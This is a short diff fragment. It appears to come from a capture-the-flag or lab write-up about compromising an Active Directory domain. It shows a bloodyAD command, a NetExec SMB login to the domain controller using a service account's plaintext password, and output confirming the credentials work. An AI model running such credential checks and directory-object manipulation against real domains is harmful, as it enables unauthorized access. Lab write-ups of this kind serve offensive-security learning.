@@ -754,3 +754,10 @@ bloodyAD --host dc01.trask.hsm -d trask.hsm -u 'svc_dcsecure_agent' -p 'DCiZS3Cu
 
 I have now restored the object under that OU 
 
+```python
+nxc smb dc01.trask.hsm -u svc_dcsecure_core -p 'DCiZS3CureD1982#' -k               
+SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\svc_dcsecure_core:DCiZS3CureD1982#
+```
+
+This account uses 
